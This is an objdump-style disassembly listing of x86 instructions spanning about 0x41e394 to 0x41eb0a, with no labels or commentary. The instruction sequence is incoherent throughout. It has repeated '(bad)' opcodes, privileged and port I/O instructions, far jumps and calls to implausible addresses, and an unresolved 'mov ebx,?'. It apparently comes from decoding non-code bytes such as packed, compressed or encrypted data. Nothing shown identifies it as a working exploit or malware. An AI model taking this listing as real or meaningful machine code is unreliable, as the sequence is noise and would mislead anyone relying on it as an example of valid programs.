  41e394:	in     al,0x8d
  41e396:	xchg   ebx,eax
  41e397:	mov    ebp,0xfa03d672
  41e39c:	and    cl,BYTE PTR [edi]
  41e39e:	sbb    BYTE PTR [ebp+0x641f9a6e],0xe1
  41e3a5:	mov    BYTE PTR [ebp-0x9],bh
  41e3a8:	inc    esp
  41e3a9:	dec    ebp
  41e3aa:	mul    BYTE PTR [edx-0x490fcc25]
  41e3b0:	bound  esp,QWORD PTR [eax-0x721258cd]
  41e3b6:	hlt    
  41e3b7:	dec    ebx
  41e3b8:	cmp    bl,BYTE PTR [esi]
  41e3ba:	push   0xffffffe5
  41e3bc:	(bad)  
  41e3bd:	sbb    ebp,DWORD PTR [edi]
  41e3bf:	mul    BYTE PTR [esi]
  41e3c1:	inc    ebx
  41e3c2:	aam    0xda
  41e3c4:	mov    ds:0xb469f923,eax
  41e3c9:	mov    esp,0xbb9b3e84
  41e3ce:	aam    0x58
  41e3d0:	sbb    edi,DWORD PTR [esi+eax*8]
  41e3d3:	into   
  41e3d4:	lea    edi,[esi-0x50]
  41e3d7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e3d8:	test   bl,0x48
  41e3db:	arpl   cx,cx
  41e3dd:	imul   ebx,DWORD PTR [ebp-0x56],0x666647cb
  41e3e4:	daa    
  41e3e5:	mov    edx,0x72edf033
  41e3ea:	or     DWORD PTR [esi],ebx
  41e3ec:	xor    BYTE PTR [eax+0x7f],al
  41e3ef:	push   es
  41e3f0:	jg     0x41e389
  41e3f2:	stos   DWORD PTR es:[edi],eax
  41e3f3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e3f4:	push   0x8eecb4
  41e3f9:	mov    bl,0xf8
  41e3fb:	xchg   edx,eax
  41e3fc:	mov    cl,0xc1
  41e3fe:	xchg   dh,cl
  41e400:	in     al,0xa6
  41e402:	test   eax,0x3c0549b7
  41e407:	mov    dh,0x1
  41e409:	sub    BYTE PTR [esi+0x2],ah
  41e40c:	call   FWORD PTR [ebx-0x4c8d24f5]
  41e412:	call   0xb9fd4bd1
  41e417:	add    eax,0x680e6668
  41e41c:	mov    al,ds:0x8993c1be
  41e421:	pop    ebx
  41e422:	pop    esi
  41e423:	add    eax,0x82c8b035
  41e428:	adc    esp,DWORD PTR ds:0x66f719e7
  41e42e:	jns    0x41e3de
  41e430:	push   edx
  41e431:	fdivr  QWORD PTR [ebp+eax*1-0x64]
  41e435:	mov    dh,0xf6
  41e437:	stc    
  41e438:	adc    BYTE PTR [ebx+0x7f],cl
  41e43b:	in     al,0x89
  41e43d:	sbb    eax,0xd64443c3
  41e442:	daa    
  41e443:	imul   eax,DWORD PTR [edi+eax*8-0x77],0xffffffaa
  41e448:	mov    bh,ah
  41e44a:	ret    0x9701
  41e44d:	add    DWORD PTR [edi-0x1f],esi
  41e450:	ja     0x41e463
  41e452:	fdivr  st,st(4)
  41e454:	jge    0x41e3d6
  41e456:	cwde   
  41e457:	shl    DWORD PTR [edx+0x54],0x85
  41e45b:	repnz dec esi
  41e45d:	mov    ebx,0x90b3514
  41e462:	jb     0x41e493
  41e464:	iret   
  41e465:	add    eax,0x795e810b
  41e46a:	cmp    esi,DWORD PTR [edi-0x6e5552a1]
  41e470:	shr    DWORD PTR [edx+0x29],cl
  41e473:	jb     0x41e412
  41e475:	and    eax,DWORD PTR [ebp+0x36]
  41e478:	nop
  41e479:	mov    al,ds:0xbe2961ca
  41e47e:	cmc    
  41e47f:	sbb    cl,BYTE PTR [edx+0x5ab6ea84]
  41e485:	pop    ebp
  41e486:	inc    esp
  41e487:	add    al,0xd5
  41e48a:	in     al,dx
  41e48b:	mov    ds:0x512e05e3,al
  41e490:	mov    ebx,0x2009558b
  41e495:	scas   eax,DWORD PTR es:[edi]
  41e496:	inc    ebx
  41e497:	(bad)  
  41e498:	mul    DWORD PTR [ebp-0x6f]
  41e49b:	sbb    esi,DWORD PTR [esi-0x64]
  41e49e:	mov    eax,ds:0x6fab8cb6
  41e4a3:	sbb    BYTE PTR [ebp-0x62183e2e],bl
  41e4a9:	lahf   
  41e4aa:	adc    al,0x5
  41e4ac:	daa    
  41e4ad:	jecxz  0x41e4df
  41e4af:	jne    0x41e4fa
  41e4b1:	loopne 0x41e43a
  41e4b3:	lds    esp,FWORD PTR [ebx]
  41e4b5:	dec    edx
  41e4b6:	jne    0x41e452
  41e4b8:	in     al,dx
  41e4b9:	xor    esp,DWORD PTR [edi-0x29]
  41e4bc:	loop   0x41e515
  41e4be:	cmp    eax,0xbd52f8ca
  41e4c3:	not    DWORD PTR [esp+ebx*8-0xf9577b6]
  41e4ca:	sub    ah,dl
  41e4cc:	or     edx,DWORD PTR [ebp+0x2b]
  41e4cf:	push   esi
  41e4d0:	and    eax,0x535180c0
  41e4d5:	(bad)
  41e4d8:	retf   0x131d
  41e4db:	xor    al,0x19
  41e4dd:	cmp    DWORD PTR [ecx],0xffffffaa
  41e4e0:	jbe    0x41e534
  41e4e2:	aaa    
  41e4e3:	push   eax
  41e4e4:	fs pushf 
  41e4e6:	and    BYTE PTR [eax+eax*1-0x33acf207],dl
  41e4ed:	mov    ch,0xc7
  41e4ef:	mov    eax,0xa9d537e3
  41e4f4:	push   ecx
  41e4f5:	or     dl,BYTE PTR [ebp+0x76]
  41e4f8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e4f9:	inc    edi
  41e4fa:	rcr    DWORD PTR [ebp+0xc63a6b9],cl
  41e500:	jnp    0x41e50c
  41e502:	push   esp
  41e503:	je     0x41e50a
  41e505:	or     eax,DWORD PTR [ebx]
  41e507:	dec    BYTE PTR [edi]
  41e509:	pop    esi
  41e50a:	mov    eax,ds:0xe7ec0c59
  41e50f:	ja     0x41e58d
  41e511:	fs push esi
  41e513:	pop    ds
  41e514:	mov    dl,0x85
  41e516:	pop    ss
  41e517:	mov    edx,0xd01bc235
  41e51c:	pop    ebx
  41e51d:	push   DWORD PTR [ebp-0x2a]
  41e520:	jbe    0x41e50c
  41e522:	mov    dl,0x95
  41e524:	push   ss
  41e525:	outs   dx,BYTE PTR ds:[esi]
  41e526:	xor    BYTE PTR [ecx+eiz*1],dl
  41e529:	xchg   edi,eax
  41e52a:	or     al,0xf0
  41e52c:	test   al,0x8f
  41e52e:	push   es
  41e52f:	sti    
  41e530:	shl    DWORD PTR [esi-0x58],cl
  41e533:	xchg   edi,eax
  41e534:	push   eax
  41e535:	mov    bl,0xe9
  41e537:	xor    BYTE PTR [eax+0x32abad96],0xc8
  41e53e:	fs dec esp
  41e540:	popf   
  41e541:	hlt    
  41e542:	shr    ch,1
  41e544:	jb     0x41e4ce
  41e546:	inc    ebx
  41e547:	(bad)  
  41e549:	add    BYTE PTR [ebx+0x7f],bh
  41e54c:	ror    DWORD PTR [edx-0x3e],cl
  41e54f:	xchg   ebp,eax
  41e550:	push   ss
  41e551:	or     BYTE PTR [ebp+0x54],al
  41e554:	adc    eax,0xda89e6f
  41e559:	addr16 pop es
  41e55b:	in     al,dx
  41e55c:	push   es
  41e55d:	imul   esi,esp,0x80f29c6d
  41e563:	les    eax,FWORD PTR [edx]
  41e565:	sub    DWORD PTR [ebx+0x66],edx
  41e568:	mov    cl,0x67
  41e56a:	jne    0x41e546
  41e56c:	out    dx,eax
  41e56d:	(bad)  
  41e56e:	push   ss
  41e56f:	jae    0x41e513
  41e571:	out    dx,al
  41e572:	pop    ss
  41e573:	push   0x506387db
  41e578:	adc    dl,BYTE PTR [ecx]
  41e57a:	inc    esp
  41e57b:	enter  0x4be8,0x9b
  41e57f:	and    eax,0x6dfc7e62
  41e584:	dec    ebx
  41e585:	outs   dx,BYTE PTR ds:[esi]
  41e586:	jae    0x41e54e
  41e588:	ins    BYTE PTR es:[edi],dx
  41e589:	pop    esi
  41e58a:	sub    cl,BYTE PTR [ecx-0x72]
  41e58d:	fiadd  DWORD PTR [ebx+edx*2-0x297c965d]
  41e594:	outs   dx,DWORD PTR ds:[esi]
  41e595:	xchg   edx,eax
  41e596:	jmp    0x41e565
  41e598:	jg     0x41e5c0
  41e59a:	mov    al,ds:0xce242aa5
  41e59f:	imul   edx,DWORD PTR [eax+esi*2-0x34],0xffffffbe
  41e5a4:	pop    esp
  41e5a5:	repz sub eax,0x4afdfa14
  41e5ab:	or     eax,ecx
  41e5ad:	call   0xdd2fa753
  41e5b2:	lahf   
  41e5b3:	pop    ebp
  41e5b4:	add    bl,BYTE PTR [edi]
  41e5b6:	ins    BYTE PTR es:[edi],dx
  41e5b7:	cmp    eax,0xba51446
  41e5bc:	push   ecx
  41e5bd:	adc    BYTE PTR [ebx-0x61137f34],dl
  41e5c3:	not    al
  41e5c5:	fcom   QWORD PTR [ebp+0x1a367139]
  41e5cb:	sahf   
  41e5cc:	mov    ah,0xb2
  41e5ce:	retf   
  41e5cf:	mov    WORD PTR [ecx+0x5277d40f],gs
  41e5d5:	push   edx
  41e5d6:	bound  edx,QWORD PTR [ecx-0x187f12c6]
  41e5dc:	jnp    0x41e5e0
  41e5de:	add    eax,0xca8de4fd
  41e5e3:	adc    BYTE PTR [eax+0x7b6fa292],0x7b
  41e5ea:	les    edi,FWORD PTR [ebp+0xb]
  41e5ed:	jp     0x41e627
  41e5ef:	arpl   di,sp
  41e5f1:	jns    0x41e630
  41e5f3:	dec    esi
  41e5f4:	cmp    edx,DWORD PTR [edx]
  41e5f6:	xchg   BYTE PTR [eax+0xd],dh
  41e5f9:	pusha  
  41e5fa:	inc    edi
  41e5fb:	pop    eax
  41e5fc:	adc    al,BYTE PTR [edi]
  41e5fe:	adc    ch,BYTE PTR [edx]
  41e600:	pop    ss
  41e601:	out    dx,eax
  41e602:	xor    al,0x84
  41e604:	jge    0x41e5b6
  41e606:	sub    edx,DWORD PTR [ebp-0x4a15800f]
  41e60c:	pop    ecx
  41e60d:	aas    
  41e60e:	mov    dl,0xed
  41e610:	into   
  41e611:	pop    esp
  41e612:	rcl    BYTE PTR [eax+0x4],cl
  41e615:	fnstcw WORD PTR [ebx-0x2e6e50a]
  41e61b:	rol    BYTE PTR [edx],cl
  41e61d:	push   ebx
  41e61e:	aaa    
  41e61f:	cli    
  41e620:	pop    ss
  41e621:	loopne 0x41e627
  41e623:	out    dx,al
  41e624:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e625:	popa   
  41e626:	add    ecx,0x707b7a96
  41e62c:	dec    edx
  41e62d:	rcr    DWORD PTR [eax],1
  41e62f:	jle    0x41e66b
  41e631:	push   0xffffff8e
  41e633:	xor    eax,0x2ba92e3e
  41e638:	xor    al,0xca
  41e63a:	or     al,al
  41e63c:	sbb    eax,0x67aa2d3a
  41e641:	or     al,0x6f
  41e643:	jle    0x41e690
  41e645:	out    0x99,eax
  41e647:	neg    ah
  41e649:	scas   al,BYTE PTR es:[edi]
  41e64a:	pop    ebp
  41e64b:	xor    ebp,ebx
  41e64d:	mov    al,ds:0x6a0689f0
  41e652:	pop    edx
  41e653:	rol    cl,1
  41e655:	xor    DWORD PTR [edx-0xa],0x78a5e0d9
  41e65c:	push   esp
  41e65d:	mov    BYTE PTR [ebp+0x23783cac],bh
  41e663:	push   edx
  41e664:	xchg   ebx,eax
  41e665:	sbb    eax,0x9b4624aa
  41e66a:	ins    BYTE PTR es:[edi],dx
  41e66b:	xor    eax,0xe8f42fa
  41e670:	lock mov bh,0xe4
  41e673:	push   es
  41e674:	or     eax,0xc45f9243
  41e679:	jecxz  0x41e6dd
  41e67b:	jmp    0x225d0cb5
  41e680:	aaa    
  41e681:	nop
  41e682:	mov    bl,0x78
  41e684:	clc    
  41e685:	loope  0x41e6e3
  41e687:	jo     0x41e673
  41e689:	lock xchg ecx,eax
  41e68b:	lea    edi,fs:[ebp-0x1e]
  41e68f:	jg     0x41e624
  41e691:	(bad)  
  41e692:	rcr    BYTE PTR [ebx],0xdf
  41e695:	lahf   
  41e696:	sbb    eax,0x4e462a22
  41e69b:	mov    edx,0xd7182e5b
  41e6a0:	int    0x73
  41e6a2:	ror    BYTE PTR [edi+0x1e],0x21
  41e6a6:	add    cl,BYTE PTR [edx]
  41e6a8:	aad    0xde
  41e6aa:	aam    0xa2
  41e6ac:	jno    0x41e6c5
  41e6ae:	dec    esp
  41e6af:	mov    edi,0x58ad95ed
  41e6b4:	mov    ah,ch
  41e6b6:	push   0xcab25f9f
  41e6bb:	push   esi
  41e6bc:	or     BYTE PTR [edi-0x6e2e8b75],al
  41e6c2:	jl     0x41e6e9
  41e6c4:	outs   dx,BYTE PTR ds:[esi]
  41e6c5:	push   ebx
  41e6c6:	test   al,0x22
  41e6c8:	iret   
  41e6c9:	dec    ebp
  41e6ca:	cli    
  41e6cb:	lock jbe 0x41e650
  41e6ce:	or     ebp,esi
  41e6d0:	fidivr WORD PTR [eax+0x62f18aba]
  41e6d6:	stc    
  41e6d7:	sahf   
  41e6d8:	(bad)  
  41e6d9:	je     0x41e754
  41e6db:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e6dc:	jo     0x41e6dd
  41e6de:	iret   
  41e6df:	mov    ebx,0xc30c881b
  41e6e4:	imul   ebp,ebp,0x59
  41e6e7:	enter  0xc6af,0xae
  41e6eb:	loop   0x41e711
  41e6ed:	loop   0x41e6e4
  41e6ef:	sbb    dl,al
  41e6f1:	call   0xcb2f:0x46411e20
  41e6f8:	inc    edi
  41e6f9:	push   ss
  41e6fa:	fistp  QWORD PTR [ebx-0x5b]
  41e6fd:	push   ebp
  41e6fe:	dec    esi
  41e6ff:	and    DWORD PTR [eax],ebp
  41e701:	push   ebx
  41e702:	mov    eax,ds:0xf685e0e1
  41e707:	bound  ebp,QWORD PTR [eax+eax*4-0x604b1245]
  41e70e:	jns    0x41e6e9
  41e710:	imul   ebp,DWORD PTR [eax+0x2ef389f0]
  41e717:	lods   al,BYTE PTR ds:[esi]
  41e718:	aad    0x7e
  41e71a:	icebp  
  41e71b:	dec    BYTE PTR [eax]
  41e71d:	or     DWORD PTR es:[edx],edi
  41e720:	or     dl,BYTE PTR [edx+0x38]
  41e723:	pop    DWORD PTR [edx]
  41e725:	cdq    
  41e726:	and    BYTE PTR [edx+0x46],al
  41e729:	dec    ecx
  41e72a:	hlt    
  41e72b:	adc    al,0x6f
  41e72d:	call   0x8ba4c831
  41e732:	cdq    
  41e733:	lahf   
  41e734:	repz cmp ch,BYTE PTR [edi+0x14]
  41e738:	jne    0x41e6ca
  41e73a:	daa    
  41e73b:	lds    ebx,FWORD PTR [edi]
  41e73d:	inc    esi
  41e73e:	xor    al,0x8c
  41e740:	in     al,0xce
  41e742:	xchg   ebp,eax
  41e743:	mov    ds:0xd437918a,al
  41e748:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e749:	push   cs
  41e74a:	push   0x40
  41e74c:	dec    ebx
  41e74d:	sub    eax,0x48227d11
  41e752:	jmp    0x84aa:0xb922b25
  41e759:	xchg   esi,eax
  41e75a:	sub    al,0xc9
  41e75c:	mov    BYTE PTR [eax],dh
  41e75e:	mov    edx,0xcfe11768
  41e763:	mov    dh,0x5e
  41e765:	sbb    eax,0xfa43d817
  41e76a:	xor    DWORD PTR [edx+0x57591d99],ecx
  41e770:	ror    BYTE PTR [edi],0x23
  41e773:	jl     0x41e7e9
  41e775:	jg     0x41e78f
  41e777:	push   es
  41e778:	jmp    0x41e78f
  41e77a:	mov    al,0x41
  41e77c:	cmp    ch,bl
  41e77e:	pop    ds
  41e77f:	aam    0xc8
  41e781:	jne    0x41e71a
  41e783:	(bad)  
  41e784:	aas    
  41e785:	pusha  
  41e786:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e787:	add    edi,DWORD PTR [edx+0xe]
  41e78a:	or     al,0x95
  41e78c:	fdivrp st(7),st
  41e78e:	dec    ecx
  41e78f:	adc    dh,ch
  41e791:	stc    
  41e792:	ins    DWORD PTR es:[edi],dx
  41e793:	mov    DWORD PTR [edx+ebx*4-0x4b],edx
  41e797:	sub    ch,BYTE PTR [edx+0x25fc55d9]
  41e79d:	mov    ebp,0xdc8d78a1
  41e7a2:	mov    eax,ds:0xaf701ad3
  41e7a7:	pop    ebp
  41e7a8:	test   BYTE PTR [eax],dh
  41e7aa:	inc    esi
  41e7ab:	adc    ecx,DWORD PTR [ebp+0x61860d4a]
  41e7b1:	or     DWORD PTR [ebx-0x4f],esp
  41e7b4:	jp     0x41e789
  41e7b6:	out    0xcf,al
  41e7b8:	push   es
  41e7b9:	inc    ecx
  41e7ba:	fadd   DWORD PTR [edx+0x13335b16]
  41e7c0:	(bad)  
  41e7c1:	hlt    
  41e7c2:	jns    0x41e80c
  41e7c4:	jnp    0x41e7df
  41e7c6:	push   ecx
  41e7c7:	dec    edi
  41e7c8:	(bad)  
  41e7c9:	iret   
  41e7ca:	or     DWORD PTR [ebp-0x42f31121],0xffffff9d
  41e7d1:	das    
  41e7d2:	stos   DWORD PTR es:[edi],eax
  41e7d3:	sbb    DWORD PTR [esp+ebp*4-0x7d2b7349],esp
  41e7da:	xor    cl,BYTE PTR [ebx]
  41e7dc:	or     al,0xfd
  41e7de:	mov    ebp,0x50e16999
  41e7e3:	push   ebx
  41e7e4:	xor    al,0xc0
  41e7e6:	retf   0x971f
  41e7e9:	lock xlat BYTE PTR ds:[ebx]
  41e7eb:	push   ecx
  41e7ec:	dec    edx
  41e7ed:	and    ah,al
  41e7ef:	jae    0x41e804
  41e7f1:	sub    dl,ah
  41e7f3:	mov    ds:0x2a09d622,eax
  41e7f8:	add    BYTE PTR [ebx+ebp*2-0x3b5271a7],ch
  41e7ff:	inc    ebp
  41e800:	inc    ebx
  41e801:	jmp    0x782e4a93
  41e806:	aad    0x75
  41e808:	ins    BYTE PTR es:[edi],dx
  41e809:	push   cs
  41e80a:	push   cs
  41e80b:	mov    ecx,0x662f4bbd
  41e810:	mov    ah,0xa9
  41e812:	jns    0x41e880
  41e814:	mov    ds:0x37eb6d95,eax
  41e819:	das    
  41e81a:	ret    0xaedf
  41e81d:	mov    bl,BYTE PTR [ebp+0xd]
  41e820:	popf   
  41e821:	mov    ds:0xc89ee690,eax
  41e826:	cld    
  41e827:	cdq    
  41e828:	stos   DWORD PTR es:[edi],eax
  41e829:	retf   
  41e82a:	sbb    WORD PTR [esi+0x79697f88],sp
  41e831:	aas    
  41e832:	clc    
  41e833:	and    eax,0x4d7d7c06
  41e838:	pop    ds
  41e839:	pop    edx
  41e83a:	sbb    ecx,DWORD PTR [ebx-0x16a3a79f]
  41e840:	mov    ebx,0xc8521b34
  41e845:	jae    0x41e8c3
  41e847:	jns    0x41e879
  41e849:	ins    DWORD PTR es:[edi],dx
  41e84a:	dec    edi
  41e84b:	stos   DWORD PTR es:[edi],eax
  41e84c:	fmul   QWORD PTR [edi]
  41e84e:	xchg   DWORD PTR [ecx],ecx
  41e850:	sub    BYTE PTR [ecx-0x32],0x1d
  41e854:	out    0xa9,al
  41e856:	push   ss
  41e857:	fstp   DWORD PTR [edi+0x6bfe89b6]
  41e85d:	ja     0x41e862
  41e85f:	xor    al,BYTE PTR [ebx+0x5]
  41e862:	xor    BYTE PTR [ecx],al
  41e864:	fstp   QWORD PTR [esp+ecx*4]
  41e867:	cmc    
  41e868:	jg     0x41e8a1
  41e86a:	hlt    
  41e86b:	mov    ah,BYTE PTR [edx+0x57]
  41e86e:	sbb    al,BYTE PTR [ecx+0x47a486ec]
  41e874:	clc    
  41e875:	jl     0x41e8e8
  41e877:	adc    eax,0x6589dce6
  41e87c:	mov    esp,0xac81e89c
  41e881:	in     al,0xfb
  41e883:	push   edx
  41e884:	push   esi
  41e885:	xchg   esp,eax
  41e886:	pop    ds
  41e887:	add    DWORD PTR [edi],eax
  41e889:	and    al,0xc5
  41e88b:	in     al,dx
  41e88c:	mov    al,ds:0xba107aec
  41e891:	scas   al,BYTE PTR es:[edi]
  41e892:	xor    bh,BYTE PTR [edx]
  41e894:	ret    
  41e895:	adc    eax,0xedfe591e
  41e89a:	xchg   edi,eax
  41e89b:	mov    ch,0xd5
  41e89d:	mov    ch,0x53
  41e89f:	out    0x1,al
  41e8a1:	inc    BYTE PTR [ecx+0x746be48b]
  41e8a7:	clc    
  41e8a8:	js     0x41e8cd
  41e8aa:	rcr    BYTE PTR [eax+edx*1],1
  41e8ad:	cmp    eax,0xe8b615b1
  41e8b2:	test   edx,ebx
  41e8b4:	inc    ecx
  41e8b5:	in     al,dx
  41e8b6:	jae    0x41e91f
  41e8b8:	xor    eax,0xe561d79c
  41e8bd:	cmp    al,BYTE PTR [eax+0x54a6a3ec]
  41e8c3:	mov    ds,WORD PTR [esp+ebx*4-0x7d]
  41e8c7:	dec    ebp
  41e8c8:	jnp    0x41e865
  41e8ca:	xchg   DWORD PTR [ebx+0x5938d236],ebx
  41e8d0:	add    BYTE PTR [ebx+0x7e5ceba0],0x99
  41e8d7:	sbb    al,BYTE PTR [esi-0x3f77511c]
  41e8dd:	pop    esi
  41e8de:	add    dh,BYTE PTR [ebp-0x55]
  41e8e1:	fnstenv [ebp-0x6]
  41e8e4:	jbe    0x41e8b7
  41e8e6:	push   ecx
  41e8e7:	psrlq  mm4,mm3
  41e8ea:	adc    ebp,DWORD PTR [ebx+ecx*2]
  41e8ed:	call   0x85b1:0xd003f0a0
  41e8f4:	stc    
  41e8f5:	mov    dl,dl
  41e8f7:	pop    es
  41e8f8:	sub    DWORD PTR [edi+0x4d],esi
  41e8fb:	xchg   ebp,eax
  41e8fc:	jo     0x41e8ca
  41e8fe:	int    0x78
  41e900:	jno    0x41e947
  41e902:	fld1   
  41e904:	mov    bh,0xdd
  41e906:	cmp    eax,0x4e83e928
  41e90b:	jge    0x41e8a0
  41e90d:	xor    DWORD PTR [ebx-0x7314f1e5],ebx
  41e913:	inc    DWORD PTR [esi-0x2a]
  41e916:	hlt    
  41e917:	mov    ebx,0xdd2c6ebc
  41e91c:	xor    BYTE PTR [ebx+eax*4-0x7ba4c8c],ch
  41e923:	in     eax,0xf
  41e925:	pop    eax
  41e926:	addr16 or esp,ecx
  41e929:	sub    esp,DWORD PTR [edx+0x4ece7a69]
  41e92f:	ds ja  0x41e987
  41e932:	stos   DWORD PTR es:[edi],eax
  41e933:	jmp    0xddd07e9
  41e938:	test   esi,ebx
  41e93a:	push   edx
  41e93b:	xchg   edi,eax
  41e93c:	mov    ch,0x9c
  41e93e:	stc    
  41e93f:	(bad)  
  41e940:	std    
  41e941:	sar    BYTE PTR [esi+0x48],1
  41e944:	adc    ebp,edx
  41e946:	xor    edi,DWORD PTR [ecx-0x46]
  41e949:	inc    BYTE PTR ds:0x11b7810f
  41e94f:	push   edx
  41e950:	out    0xf2,eax
  41e952:	mov    dh,0xc2
  41e954:	fstp   DWORD PTR [edx-0x15]
  41e957:	pop    edx
  41e958:	pusha  
  41e959:	fidiv  DWORD PTR [eax+0x2d]
  41e95c:	retf   0x9d20
  41e95f:	jmp    0xea509a38
  41e964:	mov    ch,0xe2
  41e966:	inc    edx
  41e967:	sbb    bl,dl
  41e969:	loop   0x41e951
  41e96b:	int    0x12
  41e96d:	jge    0x41e910
  41e96f:	nop
  41e970:	cwde   
  41e971:	cmp    BYTE PTR [esi-0x19],ch
  41e974:	sbb    DWORD PTR [esi-0x54],ebx
  41e977:	jle    0x41e943
  41e979:	imul   ah
  41e97b:	dec    esi
  41e97c:	mov    ds:0xf7a1feae,eax
  41e981:	dec    ecx
  41e982:	inc    esp
  41e983:	fwait
  41e984:	outs   dx,BYTE PTR ds:[esi]
  41e985:	mov    ch,0x19
  41e987:	scas   eax,DWORD PTR es:[edi]
  41e988:	ret    0xb7f
  41e98b:	inc    esi
  41e98c:	(bad)  
  41e98d:	loop   0x41e96b
  41e98f:	cmp    eax,0x19b00be2
  41e994:	retf   
  41e995:	adc    eax,0x3bcf11b0
  41e99a:	cmp    DWORD PTR [edi-0x32a4b5da],esi
  41e9a0:	add    esp,DWORD PTR [ecx]
  41e9a2:	test   bh,bl
  41e9a4:	jmp    0x41ea0b
  41e9a6:	ja     0x41e928
  41e9a8:	addr16 pusha 
  41e9aa:	inc    esp
  41e9ab:	push   ds
  41e9ac:	loopne 0x41e9bc
  41e9ae:	jbe    0x41e9a7
  41e9b0:	rcr    DWORD PTR [ecx],1
  41e9b2:	in     al,dx
  41e9b3:	clc    
  41e9b4:	loop   0x41e952
  41e9b6:	cmp    cl,BYTE PTR ds:0x25199126
  41e9bc:	test   al,0xc6
  41e9be:	or     DWORD PTR [esi],esp
  41e9c0:	xchg   edx,eax
  41e9c1:	shr    bh,cl
  41e9c3:	test   bh,bh
  41e9c5:	pop    eax
  41e9c6:	push   ebx
  41e9c7:	bound  ebx,QWORD PTR [ecx-0x78]
  41e9ca:	sbb    edx,eax
  41e9cc:	push   0xffffffac
  41e9ce:	push   cs
  41e9cf:	out    0xe3,al
  41e9d1:	or     DWORD PTR [esi-0x59],0x3f4f0a2e
  41e9d8:	rcr    BYTE PTR [esi],0x80
  41e9db:	push   esi
  41e9dc:	mov    esi,0x4301f310
  41e9e1:	sbb    BYTE PTR [edx-0x272d60b5],0x79
  41e9e8:	xchg   edx,ebx
  41e9ea:	out    dx,al
  41e9eb:	xor    BYTE PTR [edi],ah
  41e9ed:	or     eax,0x1c92d0d2
  41e9f2:	or     ebp,ebp
  41e9f4:	push   cs
  41e9f5:	test   al,0x9c
  41e9f7:	pop    esp
  41e9f8:	js     0x41ea57
  41e9fa:	retf   0xca1b
  41e9fd:	in     eax,0x5f
  41e9ff:	jbe    0x41e9b7
  41ea01:	jns    0x41e9de
  41ea03:	xchg   edi,eax
  41ea04:	aad    0x1
  41ea06:	mov    edi,0x4b7e7279
  41ea0b:	mov    WORD PTR [eax],fs
  41ea0d:	hlt    
  41ea0e:	adc    bl,BYTE PTR [esi+eax*4+0x37fb54ec]
  41ea15:	sub    eax,0x361d25c1
  41ea1a:	xor    dl,BYTE PTR [ebp+ebp*2+0x92c2964]
  41ea21:	pop    esi
  41ea22:	jle    0x41ea45
  41ea24:	xchg   BYTE PTR [ebp-0x2566276b],bh
  41ea2a:	lds    ebp,FWORD PTR [ebp-0x7e]
  41ea2d:	sub    BYTE PTR [edx+0x16],dh
  41ea30:	iret   
  41ea31:	leave  
  41ea32:	push   ebx
  41ea33:	(bad)  
  41ea34:	sti    
  41ea35:	push   ds
  41ea36:	pop    es
  41ea37:	mov    eax,0x7731d677
  41ea3c:	jecxz  0x41eab8
  41ea3e:	sbb    bl,BYTE PTR [edi+0x28e4bdee]
  41ea44:	(bad)  
  41ea45:	sbb    eax,0x744986e4
  41ea4a:	mov    ebx,?
  41ea4c:	add    DWORD PTR [eax],eax
  41ea4e:	(bad)  
  41ea4f:	outs   dx,BYTE PTR ds:[esi]
  41ea50:	mul    esp
  41ea52:	and    al,0xf0
  41ea54:	mov    cl,0xcf
  41ea56:	(bad)  
  41ea57:	gs test edi,ebx
  41ea5a:	mov    bl,0xc9
  41ea5c:	inc    ebx
  41ea5d:	loop   0x41ea62
  41ea5f:	scas   eax,DWORD PTR es:[edi]
  41ea60:	shl    DWORD PTR [edi],0x28
  41ea63:	in     al,dx
  41ea64:	fld    DWORD PTR [edi+0x7fb9345a]
  41ea6a:	and    cl,ch
  41ea6c:	(bad)  
  41ea6d:	xor    edi,ecx
  41ea6f:	xlat   BYTE PTR ds:[ebx]
  41ea70:	loop   0x41ea59
  41ea72:	fst    st(4)
  41ea74:	ffree  st(0)
  41ea76:	pop    ss
  41ea77:	dec    eax
  41ea78:	add    cl,BYTE PTR [eax-0x39]
  41ea7b:	imul   ebx,DWORD PTR [ebp-0x21],0x70bceb7a
  41ea82:	xchg   edx,eax
  41ea83:	setp   BYTE PTR [eax]
  41ea86:	push   esi
  41ea87:	add    DWORD PTR [edi-0x46f00475],ebx
  41ea8d:	ret    
  41ea8e:	repnz mov al,0xe0
  41ea91:	rcl    DWORD PTR [ebp-0x1e397577],1
  41ea97:	mov    ebp,DWORD PTR [eax-0x58d9cb46]
  41ea9d:	mov    edx,0x7592c5e1
  41eaa2:	jns    0x41ea56
  41eaa4:	js     0x41ea3c
  41eaa6:	dec    ecx
  41eaa7:	fild   QWORD PTR [ebp+0x42]
  41eaaa:	mov    bh,0x27
  41eaac:	jmp    0x694c:0xf5ff3a41
  41eab3:	ins    BYTE PTR es:[edi],dx
  41eab4:	(bad)  
  41eab5:	jns    0x41ea75
  41eab7:	das    
  41eab8:	stc    
  41eab9:	sub    DWORD PTR [esi+0x573add98],eax
  41eabf:	(bad)  [edi]
  41eac1:	fcmovnu st,st(6)
  41eac3:	sbb    eax,0xca8edf99
  41eac8:	les    edx,FWORD PTR [ecx+0x4]
  41eacb:	adc    ah,al
  41eacd:	leave  
  41eace:	popa   
  41eacf:	jb     0x41eb2c
  41ead1:	cdq    
  41ead2:	retf   0xf5ba
  41ead5:	cmp    al,0xe6
  41ead7:	pop    ecx
  41ead8:	inc    esp
  41ead9:	(bad)  
  41eada:	rol    dl,cl
  41eadc:	jae    0x41eb45
  41eade:	clc    
  41eadf:	aad    0x6e
  41eae1:	pop    edx
  41eae2:	das    
  41eae3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41eae4:	xor    BYTE PTR [edi+0x5e],cl
  41eae7:	pop    es
  41eae8:	cwde   
  41eae9:	data16 mov ch,0x14
  41eaec:	xchg   edi,eax
  41eaed:	mov    ebp,DWORD PTR [edi+0x1]
  41eaf0:	repnz test BYTE PTR [ecx+eax*2-0x3c454731],0x2f
  41eaf9:	stos   BYTE PTR es:[edi],al
  41eafa:	add    edx,ecx
  41eafc:	fdiv   DWORD PTR [edx-0x611d6b8a]
  41eb02:	xor    al,0x35
  41eb04:	sub    DWORD PTR ds:0xcc34360b,edi
  41eb0a:	adc    al,0x4a
